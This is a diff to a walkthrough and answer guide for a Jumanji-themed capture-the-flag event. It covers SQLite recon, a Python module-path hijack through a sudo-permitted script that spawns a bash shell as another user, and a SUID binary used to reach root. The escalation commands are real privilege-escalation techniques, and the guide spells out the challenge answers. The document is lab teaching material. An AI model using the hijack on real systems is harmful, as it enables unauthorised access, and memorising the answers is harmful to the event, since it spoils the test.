@@ -1,16 +1,16 @@
 # 🧭 Technozion SDC Games: Master Challenge Walkthrough
 
-This document provides the definitive, step-by-step solver guide and cheat-sheet for all challenges across **Day 1 Level 2 (Avatars)**, **Day 1 Level 3 (Simulation Core Mainframe)**, and **Day 2 Level 2 (The Jumanji Gauntlet)**.
+This document provides the definitive, step-by-step solver guide and cheat-sheet for all active challenges across **Day 1 Level 2 (Avatars)** and **Day 2 Level 1 (Simulation Core Mainframe)**, as well as archived notes for the **Jumanji Gauntlet**.
 
 ---
 
 ## 1. Quick Tournament Scoring Matrix
 
-| Event / Level           | Focus Area                       | Objectives / Flags                                                         | Max Score         | Progression Trigger                                  |
-| :---------------------- | :------------------------------- | :------------------------------------------------------------------------- | :---------------- | :--------------------------------------------------- |
-| **Day 1 Level 2** | Jungle Recon & Cryptanalysis     | 5 Avatars (`bravestone`, `ruby`, `finbar`, `oberon`, `seaplane`) | **150 PTS** | Victory video (`jumanji_win.mp4`) & Level 3 unlock |
-| **Day 1 Level 3** | Mainframe Core & PrivEsc         | 2 Overrides (`round3_user`, `round3_root`)                             | **200 PTS** | Purge video (`round3_win.mp4`) & auto-completion   |
-| **Day 2 Level 2** | The Jumanji Gauntlet (16 Squads) | Pod Relics, Duels, Shrine KotH, Final Jewel                                | **Dynamic** | Crown tournament champion & export Top 4 teams       |
+| Event / Level           | Focus Area                   | Objectives / Flags                                                         | Max Score          | Progression Trigger                                  |
+| :---------------------- | :--------------------------- | :------------------------------------------------------------------------- | :----------------- | :--------------------------------------------------- |
+| **Day 1 Level 2** | Jungle Recon & Cryptanalysis | 5 Avatars (`bravestone`, `ruby`, `finbar`, `oberon`, `seaplane`) | **150 PTS**  | Victory video (`jumanji_win.mp4`) & Hub completion |
+| **Day 2 Level 1** | Mainframe Core & PrivEsc     | 2 Overrides (`day2_level1_user` 80 pts, `day2_level1_root` 120 pts)    | **200 PTS**  | Purge video (`round3_win.mp4`) & auto-completion   |
+| *(Archived)* Gauntlet | Multi-Team Co-op Tournament  | Pod Relics, Duels, Shrine KotH (Archived in `archive/gauntlet`)          | **Archived** | Safely isolated; redirects to `/hub`               |
 
 ---
 
@@ -80,33 +80,68 @@ parrot_hint 5    # Seaplane McDonough clue
 
 ---
 
-## 3. Day 1 Level 3: Simulation Core Mainframe (200 Points)
+## 3. Day 2 Level 1: Simulation Core Mainframe (200 Points)
 
-When players access `/level3`, an interactive security terminal (`recon_user@sdc-day1-level3:~$`) is provisioned.
+When players access `/day2/level1` (or legacy `/level3`), an interactive security terminal (`recon_user@sdc-day2-level1:~$`) is provisioned.
 
 ### Step 3.1: Database Extraction (80 PTS)
 
-- **Concept**: SQLite database query and schema reconnaissance.
-- **Location**: `/level3/mainframe.db`
+- **Concept**: SQLite relational schema reconnaissance, decoy discrimination, and forensic log analysis.
+- **Lore Guidance**: Consult Alan Parrish's Field Journal (`cat parrish_journal.txt` Entry 1) and `/var/log/mainframe/node_state.log`.
+- **Location**: `/level1/mainframe.db` (configured via `/level1/.env`)
+- **Inspection & Analysis**:
+  ```bash
+  cat .env
+  cat /var/log/mainframe/node_state.log
+  # Confirms Node 1 ('admin_access') is the ONLINE production node; others are decoys
+  sqlite3 /level1/mainframe.db ".schema"
+  ```
 - **Solve Command**:
   ```bash
-  sqlite3 /level3/mainframe.db "SELECT code FROM overrides WHERE target = 'admin_access';"
-  deploy_override $(sqlite3 /level3/mainframe.db "SELECT code FROM overrides WHERE target = 'admin_access';")
+  sqlite3 /level1/mainframe.db "SELECT code FROM overrides WHERE target = 'admin_access';"
+  deploy_override $(sqlite3 /level1/mainframe.db "SELECT code FROM overrides WHERE target = 'admin_access';")
   ```
 
-### Step 3.2: SUID Binary Privilege Escalation (120 PTS)
+### Step 3.2: Lateral Escalation to `jumanji_admin`
 
-- **Concept**: Ephemeral SUID binary inspection and environment variable injection.
-- **Binary**: `/home/jumanji_admin/lift_curse` (Permissions: `-rwsr-xr-x 1 root root`)
-- **Inspection**:
+- **Concept**: Python search path hijacking via sudo-permitted maintenance script.
+- **Lore Guidance**: Alan Parrish's Field Journal (`cat parrish_journal.txt` Entry 2: *"The caretaker's audit hound searches only where it stands... plant your own seed in the dirt beneath your boots, name it vault_utils..."*).
+- **Sudo Discovery**:
   ```bash
-  strings /home/jumanji_admin/lift_curse | grep CHANT
-  # Reveals required environment variable CHANT=JUMANJI
+  sudo -l
+  # Output: (jumanji_admin) NOPASSWD: /opt/jumanji/maintenance/audit_vault.py
+  ```
+- **Exploitation**:
+  ```bash
+  cd /level1
+  cat << 'EOF' > vault_utils.py
+  import os, pty
+  pty.spawn("/bin/bash")
+  EOF
+  sudo -u jumanji_admin /opt/jumanji/maintenance/audit_vault.py
+  # Spawns interactive shell as jumanji_admin!
+  ```
+
+### Step 3.3: SUID Binary Reversing & Root Escalation (120 PTS)
+
+- **Concept**: Stripped ELF reverse engineering, XOR stack string de-obfuscation, environment variable ritual injection, and argument sigil validation.
+- **Lore Guidance**: Alan Parrish's Field Journal Entry 3 (432 Hz resonance frequency, 1995 awakening year) & Nigel Billingsley's radio comms (`nigel_comms`).
+- **Binary**: `/home/jumanji_admin/lift_curse` (Permissions: `-rwsr-xr-x 1 root root`, stripped)
+- **Reversing / Dynamic Analysis**:
+  ```bash
+  # Binary execution without ritual:
+  /home/jumanji_admin/lift_curse
+  # [JUMANJI ALTAR] The stone jaguar's eyes remain cold... Imbue environment with JUMANJI_RITUAL
+
+  # Binary execution with ritual:
+  JUMANJI_RITUAL=CHANT_432HZ /home/jumanji_admin/lift_curse
+  # [JUMANJI ALTAR] The jaguar's ruby eyes flare red! ... Challenge with: lift_curse --awaken <SIGIL>
   ```
 - **Escalation & Solve Command**:
   ```bash
-  export CHANT="JUMANJI"
-  /home/jumanji_admin/lift_curse
+  export JUMANJI_RITUAL="CHANT_432HZ"
+  /home/jumanji_admin/lift_curse --awaken 1995
+
   # Inside root shell:
   cat /root/core_override.txt
   deploy_override $(cat /root/core_override.txt)
@@ -114,9 +149,12 @@ When players access `/level3`, an interactive security terminal (`recon_user@sdc
 
 ---
 
-## 4. Day 2 Level 2: The Jumanji Gauntlet (Dual-Role Co-Op)
+## 4. Archived Reference: The Jumanji Gauntlet (`archive/gauntlet`)
 
-In Day 2 Level 2, squads consist of **strictly 2 players**:
+> [!NOTE]
+> The Jumanji Gauntlet tournament engine has been archived and removed from active competition. The documentation below is retained for architectural reference.
+
+In Day 2 Level 2, squads consisted of **strictly 2 players**:
 
 1. **Player 1 (Navigator)**: Terminal CLI inside container (`recon_user@<team>-day2-level2:~$`).
 2. **Player 2 (Cartographer)**: Web telemetry HUD (`/gauntlet`).
